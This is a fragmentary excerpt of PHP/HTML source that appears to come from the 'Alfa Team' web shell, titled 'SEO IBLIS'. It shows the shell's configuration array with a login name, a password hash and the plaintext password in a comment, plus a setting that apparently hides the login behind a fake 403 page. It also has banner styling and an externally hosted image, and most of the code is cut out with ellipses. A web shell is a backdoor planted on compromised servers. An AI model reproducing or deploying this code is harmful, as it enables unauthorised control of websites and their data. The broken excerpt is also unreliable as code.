...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '91bc01c63a66d2d36af911c85aa4b17c',//Azzure1337@#$
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
  ...
  <style>
    ...
    * {
    ...
    .banner {
      ...
      align-items: center;
      flex-direction: column;
      clip-path: polygon(0 0, 100% 0, 100% 100%, 45% 100%); /* dibuat lebih lebar */
      padding: 40px 30px;
...
<title>..:: SEO IBLIS ::..</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co.com/rGCJ4YbL/Gear-2-1.jpg" /></center>
